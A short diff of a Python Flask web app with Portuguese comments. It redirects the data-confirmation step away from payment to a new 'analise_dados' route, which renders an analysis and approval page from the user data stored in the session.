@@ -351,9 +351,21 @@ def confirmar_dados():
     }
     session['dados_usuario'] = dados_usuario
 
-    # Redireciona para a próxima etapa
-    return redirect(url_for('pagamento'))
+    # Redireciona para a página de análise
+    return redirect(url_for('analise_dados'))
 
+
+@app.route('/analise_dados')
+def analise_dados():
+    """Rota para a página de análise de dados e aprovação"""
+    user_data = session.get('dados_usuario')
+    if not user_data:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('index'))
+
+    return render_template('analise_dados.html',
+                         user_data=user_data,
+                         current_year=datetime.now().year)
 
 @app.route('/selecionar_estado', methods=['POST'])
 def selecionar_estado():
